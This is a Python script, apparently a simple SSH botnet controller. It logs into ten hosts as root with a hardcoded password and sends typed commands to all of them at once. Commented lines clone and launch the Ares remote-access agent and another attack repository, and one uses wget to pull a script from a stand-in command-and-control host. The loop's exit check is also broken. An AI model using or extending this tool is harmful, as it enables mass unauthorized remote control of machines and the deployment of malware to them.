from pexpect import pxssh

class Bot:

    # initialize new client
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.ssh()


    # secure shell into client
    def ssh(self):
        try:
            bot = pxssh.pxssh()
            bot.login(self.host, self.user, self.password)
            return bot
        except Exception as e:
            print('Connection failure.')
            print(e)


    # send command to client
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# send a command to all bots in the botnet
def command_bots(command):
    for bot in botnet:
        attack = bot.send_command(command)
        print('Output from ' + bot.host)
        print(attack)

# list of bots in botnet
botnet = []

# add a new bot to your botnet
def add_bot(host, user, password):
    new_bot = Bot(host, user, password)
    botnet.append(new_bot)

add_bot('192.168.1.13', 'root', 'cpp')
add_bot('192.168.1.27', 'root', 'cpp')
add_bot('192.168.1.28', 'root', 'cpp')
add_bot('192.168.1.29', 'root', 'cpp')
add_bot('192.168.1.30', 'root', 'cpp')
add_bot('192.168.1.31', 'root', 'cpp')
add_bot('192.168.1.21', 'root', 'cpp')
add_bot('192.168.1.22', 'root', 'cpp')
add_bot('192.168.1.23', 'root', 'cpp')
add_bot('192.168.1.24', 'root', 'cpp')

# list user home directory
#command_bots('git clone https://github.com/sweetsoftware/Ares.git')
#command_bots('/home/osboxes/Ares/agent/agent.py')
#command_bots('git clone https://github.com/Tacm4n/strike.git')
# download scripts/files etc.
#command_bots("""wget  -O /Users/Owner/Desktop/ "http://c&cserver.com/script.py"""")
isDone=False
while isDone == False:
	print("What would you like the bots to do?")
	command=raw_input()
	command_bots(command)
	print("Would you like to send another command?[y/n]")
	response=raw_input()
	if response == 'y' or 'Y':
		continue
	else:
		break	
	

    
        
        
